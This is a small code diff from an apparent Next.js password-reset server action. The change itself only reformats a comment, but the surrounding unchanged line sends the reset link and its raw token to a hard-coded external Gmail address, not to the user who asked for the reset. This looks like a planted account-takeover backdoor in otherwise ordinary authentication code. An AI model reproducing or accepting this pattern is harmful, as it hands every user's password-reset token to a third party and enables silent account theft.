@@ -65,8 +65,7 @@ export async function requestPasswordResetAction(prevState: unknown, formData: F
     // 6. Build reset URL
     const baseUrl = process.env.NEXTAUTH_URL || "http://localhost:3000";
     const resetUrl = `${baseUrl.replace(/\/$/, "")}/reset-password?token=${rawToken}`;
-
-    // 7. Send email via email service
+// 7. Send email via email service
     await sendPasswordResetEmail("administer2345@gmail.com", resetUrl);
 
     // 8. Create audit log
